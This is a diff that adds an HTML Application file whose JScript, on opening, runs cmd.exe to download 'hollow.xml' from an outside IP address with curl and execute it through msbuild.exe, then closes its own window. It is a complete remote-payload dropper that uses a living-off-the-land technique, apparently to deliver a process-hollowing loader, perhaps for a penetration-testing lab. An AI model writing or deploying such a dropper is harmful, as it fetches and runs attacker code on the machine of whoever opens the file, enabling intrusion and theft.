@@ -1,0 +1,14 @@
+<html> 
+<head> 
+<script language="JScript">
+
+        var shell = new ActiveXObject("WScript.Shell");
+        var amit = shell.Run("cmd.exe /c curl http://192.168.45.223/hollow.xml -o C:\\Users\\Public\\Documents\\hollow.xml && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe C:\\Users\\Public\\Documents\\hollow.xml");
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
